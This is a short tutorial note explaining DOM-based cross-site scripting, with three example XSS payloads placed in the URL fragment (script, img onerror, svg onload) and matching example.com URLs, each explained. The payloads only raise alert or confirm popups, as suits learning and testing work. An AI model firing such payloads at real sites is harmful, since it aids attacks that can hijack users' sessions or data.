DOM XSS
DOM XSS happens when the JavaScript on the page takes data from the URL
and injects it directly into the page using the DOM, not server-side.

This type doesnâ€™t need the server to reflect anything 
the client-side JavaScript does the damage.

It runs when the browser loads the page and executes JS that trusts user input.

Example Payloads:

#<script>alert(1)</script>
#"><img src=x onerror=alert('dom')>
#"><svg/onload=confirm(777)>
 
Example URLs:
https://example.com/page.html#<script>alert(1)</script>
https://example.com/page.html#"><img src=x onerror=alert('dom')>
https://example.com/page.html#"><svg/onload=confirm(777)>
What They Do:
First one runs a popup if JS on the page injects the hash into the DOM.

Second one fires a popup through image error if inserted into innerHTML or similar.

Third one abuses SVG tag loading if the site copies hash content into the DOM.

SVG tag is an image tag that can run JavaScript events.
